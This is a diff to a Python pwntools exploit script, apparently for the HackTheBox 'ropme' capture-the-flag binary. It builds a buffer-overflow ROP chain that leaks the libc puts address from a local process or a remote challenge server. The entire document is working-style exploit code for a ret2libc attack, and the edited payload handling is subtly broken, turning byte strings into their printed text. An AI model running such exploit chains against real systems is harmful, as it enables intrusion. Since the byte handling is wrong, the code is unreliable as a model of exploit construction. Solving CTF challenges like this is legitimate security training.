@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-
+#import gdb
 from pwn import *
 import argparse
 
@@ -9,11 +9,12 @@ context.word_size = 64
 context.endian = 'little'
 context.log_level = 'DEBUG'
 
+pty = process.PTY
 program_name = './ropme'
 elf = ELF(program_name)
-#dremote_server = 'docker.hackthebox.eu'
-remote_server = '64.227.39.89'
-PORT = '31122'
+dremote_server = 'docker.hackthebox.eu'
+remote_server = '178.62.86.12'
+PORT = '30889'
 #dPORT = '30090'
 
 parser = argparse.ArgumentParser(description='Exploit the bins.')
@@ -24,7 +25,7 @@ args = parser.parse_args()
 if args.remote:
     p = remote(remote_server, PORT)
 else:
-    p = process(program_name)
+    p = process(program_name, stdin=pty, stdout=pty)
 
 if args.dbg:
     gdb.attach(p, '''
@@ -35,16 +36,26 @@ if args.dbg:
 junk = "A" * 72
 pop_rdi = p64(0x4006d3)
 got_put = p64(0x601018)
-plt_put = p64(0x4004e0)
+plt_put = p64(0x4005e0)
 plt_main = p64(0x400626)
 
-payload = f'junk, {pop_rdi}, {got_put}, {plt_put}, {plt_main}'
+payload = f"{junk}{pop_rdi}{got_put}{plt_put}{plt_main}"
 
-p.recvuntil("ROP me outside, how 'about dah?")
-p.sendline(payload)
-p.recvline()
+payload = payload.replace("b", "")
+payload = payload.replace("'b'", "")
+payload = payload.replace("'", "")
 
-leaked_puts = p.recvline().strip().ljust(8, "\x00")
+p.recvuntil(b"ROP me outside, how 'about dah?")
+p.sendline(bytes(payload, encoding='utf8'))
+#p.clean()
+p.recvline(keepends=False)
+#p.interactive()
+try:
+    leaked_puts = p.recvline().strip().ljust(8, "\x00")
+except EOFError:
+    print('error')
+
+
 log.success('Leaked puts@GLIBC: ' + str(hex(u64(leaked_puts))))
 
 leaked_puts = u64(leaked_puts)
